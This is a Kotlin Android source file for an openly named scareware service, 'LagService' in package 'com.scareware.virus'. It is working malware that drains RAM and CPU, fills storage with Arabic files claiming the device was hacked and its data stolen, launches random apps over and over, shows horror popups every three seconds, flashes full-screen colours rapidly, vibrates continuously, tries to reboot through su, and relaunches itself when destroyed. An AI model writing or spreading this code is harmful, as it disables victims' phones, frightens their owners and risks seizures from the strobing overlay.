package com.scareware.virus

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.os.VibrationEffect
import android.os.Vibrator
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.FrameLayout
import androidx.core.app.NotificationCompat
import java.io.File
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.random.Random

class LagService : Service() {

    private val running = AtomicBoolean(true)
    private val handler = Handler(Looper.getMainLooper())
    private val executor = Executors.newCachedThreadPool()
    private val ramChunks = mutableListOf<ByteArray>()
    private var windowManager: WindowManager? = null
    private var flashView: View? = null
    private var startTime = 0L

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startTime = System.currentTimeMillis()
        startForeground(99, buildNotification())
        startRamAttack()
        startJunkArabicFlood()
        startInfiniteAppOpen()
        startScarePopupEvery3s()
        startScreenFlash()
        startVibrateLoop()
        // After ~30s try reboot
        handler.postDelayed({ tryReboot() }, 30000)
        return START_STICKY
    }

    private fun buildNotification(): Notification {
        val id = "sys"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(id, "System", NotificationManager.IMPORTANCE_MIN)
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
        val pi = PendingIntent.getActivity(this, 0, Intent(this, MainActivity::class.java), PendingIntent.FLAG_IMMUTABLE)
        return NotificationCompat.Builder(this, id)
            .setContentTitle("فيروس")
            .setContentText("...")
            .setSmallIcon(android.R.drawable.ic_dialog_alert)
            .setContentIntent(pi)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    private fun startRamAttack() {
        executor.execute {
            while (running.get()) {
                try {
                    val chunk = ByteArray(12 * 1024 * 1024)
                    for (i in chunk.indices step 4096) chunk[i] = 1
                    synchronized(ramChunks) {
                        ramChunks.add(chunk)
                        if (ramChunks.size > 50) ramChunks.removeAt(0)
                    }
                } catch (_: OutOfMemoryError) {
                    Thread.sleep(1000)
                }
                Thread.sleep(200)
            }
        }
        repeat(5) {
            executor.execute {
                var x = 0L
                while (running.get()) x = (x * 31 + 17) xor System.nanoTime()
            }
        }
    }

    /** Tạo file rác tên Ả Rập siêu nhanh */
    private fun startJunkArabicFlood() {
        executor.execute {
            val names = listOf("فيروس", "اختراق", "بيانات", "سرقة", "نظام", "تدمير", "رمز", "خطر")
            var n = 0
            while (running.get() && n < 500) {
                try {
                    val dir = File(filesDir, "عربي_tmp")
                    if (!dir.exists()) dir.mkdirs()
                    val name = names[Random.nextInt(names.size)] + "_" + System.currentTimeMillis() + "_" + n + ".txt"
                    val f = File(dir, name)
                    f.writeText("تم اختراق جهازك ⚠ فيروس النظام ⚠ بيانات مسروقة\n".repeat(50))
                    n++
                    Thread.sleep(60) // rất nhanh
                } catch (_: Exception) {
                    Thread.sleep(300)
                }
            }
        }
    }

    /** Mở app vô hạn, rất nhanh */
    private fun startInfiniteAppOpen() {
        handler.postDelayed(object : Runnable {
            override fun run() {
                if (!running.get()) return
                tryOpenRandomApp()
                handler.postDelayed(this, Random.nextLong(1500, 3500)) // siêu nhanh
            }
        }, 2000)
    }

    private fun tryOpenRandomApp() {
        try {
            val pm = packageManager
            val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
                .filter { (it.flags and ApplicationInfo.FLAG_SYSTEM) == 0 && it.packageName != packageName }
            if (apps.isEmpty()) return
            val target = apps[Random.nextInt(apps.size)]
            val launch = pm.getLaunchIntentForPackage(target.packageName) ?: return
            launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(launch)
        } catch (_: Exception) {}
    }

    /** Mỗi 3 giây hiện ảnh kinh dị full màn */
    private fun startScarePopupEvery3s() {
        handler.postDelayed(object : Runnable {
            override fun run() {
                if (!running.get()) return
                try {
                    val i = Intent(this@LagService, ScarePopupActivity::class.java)
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    startActivity(i)
                } catch (_: Exception) {}
                handler.postDelayed(this, 3000)
            }
        }, 3000)
    }

    private fun startScreenFlash() {
        try {
            windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT
            )
            params.gravity = Gravity.TOP or Gravity.START
            flashView = FrameLayout(this).apply { setBackgroundColor(Color.RED); alpha = 0f }
            windowManager?.addView(flashView, params)

            val colors = intArrayOf(Color.BLACK, Color.RED, Color.WHITE, Color.YELLOW)
            handler.post(object : Runnable {
                override fun run() {
                    flashView?.let {
                        it.setBackgroundColor(colors[Random.nextInt(colors.size)])
                        it.alpha = if (Random.nextBoolean()) 0.9f else 0.2f
                    }
                    handler.postDelayed(this, Random.nextLong(50, 200))
                }
            })
        } catch (_: Exception) {}
    }

    private fun startVibrateLoop() {
        handler.post(object : Runnable {
            override fun run() {
                if (!running.get()) return
                try {
                    val v = getSystemService(VIBRATOR_SERVICE) as Vibrator
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        v.vibrate(VibrationEffect.createOneShot(400, VibrationEffect.DEFAULT_AMPLITUDE))
                    } else {
                        @Suppress("DEPRECATION")
                        v.vibrate(400)
                    }
                } catch (_: Exception) {}
                handler.postDelayed(this, 1500)
            }
        })
    }

    /** Cố reboot - hầu hết máy thường sẽ từ chối (cần system/signature) */
    private fun tryReboot() {
        try {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            pm.reboot(null)
        } catch (_: Exception) {
            try {
                Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot"))
            } catch (_: Exception) {
                // Không reboot được thì tiếp tục lag
            }
        }
    }

    override fun onDestroy() {
        running.set(false)
        try { flashView?.let { windowManager?.removeView(it) } } catch (_: Exception) {}
        val restart = Intent(this, LagService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(restart)
        else startService(restart)
        super.onDestroy()
    }
}
